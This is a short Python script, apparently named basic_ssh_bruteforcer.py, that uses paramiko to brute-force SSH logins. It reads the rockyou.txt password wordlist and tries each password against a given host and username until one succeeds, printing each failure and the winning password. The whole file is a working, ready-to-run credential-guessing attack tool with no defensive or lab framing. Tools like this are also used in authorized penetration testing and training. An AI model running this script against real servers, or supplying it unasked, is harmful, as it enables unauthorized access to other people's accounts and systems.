import sys
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException
import socket

def sshBruteforce():
    if len(sys.argv) < 3:
        print("Usage: python basic_ssh_bruteforcer.py <host> <login>")
        return

    host = sys.argv[1]
    login = sys.argv[2]

    try:
        with open('/usr/share/wordlists/rockyou.txt') as f:
            for line in f:
                password = line.strip()
                try:
                    client = SSHClient()
                    client.set_missing_host_key_policy(AutoAddPolicy())
                    client.connect(host, username=login, password=password, timeout=10)  # Added timeout
                    print(f"Success: {password}")
                    break
                except AuthenticationException:
                    print(f"Failed: {password}")
                except socket.timeout:
                    print(f"Connection timed out for password: {password}")
                except Exception as e:
                    print(f"An error occurred: {e}")
                finally:
                    client.close()
    except FileNotFoundError:
        print("Wordlist file not found. Please check the path.")

if __name__ == "__main__":
    sshBruteforce()